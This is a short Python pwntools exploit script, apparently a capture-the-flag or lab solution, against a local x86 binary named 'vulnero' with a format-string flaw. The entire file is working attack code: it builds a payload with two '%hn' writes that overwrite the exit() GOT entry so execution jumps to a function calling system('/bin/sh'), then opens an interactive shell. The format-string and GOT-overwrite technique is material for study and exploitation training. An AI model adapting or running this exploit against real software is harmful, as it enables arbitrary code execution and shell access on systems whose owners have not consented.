#!/usr/bin/python

#---------------------------------------#
# Arch: x86                             #
# Protections: NX, ASLR, Partial RELRO  #
# Vuln Type: format strings exploitation#
# OS: Kali Linux 5.10.0-kali9-amd64     #
#---------------------------------------#

from pwn import *

r = process("./vulnero")

def exploit():

    # write where (exit() GOT entry - appearing at the end of strings()):
    var_low = (0x804c01c)
    var_high = var_low + 2

    # write what:
    # 08 04 92 09 --> to_remove function (system('/bin/sh'))

    #------------------------------------------#

    # writing second half

    payload = ""
    payload += p32(var_low)
    payload += p32(var_high)

    count_low = 0x9209 - len(payload)

    payload += "%" + str(count_low) + "p"
    payload += "%6$hn"

    #-------------------------------------------#

    # writing first half

    count_high = 0x010804 - 0x9209

    payload += "%" + str(count_high) + "p"
    payload += "%7$hn"

    r.sendline(payload)
    r.interactive()


def main():

    r.recv()
    r.sendline("2")
    r.recvuntil("value:")
    exploit()

if __name__ == "__main__":
    main()
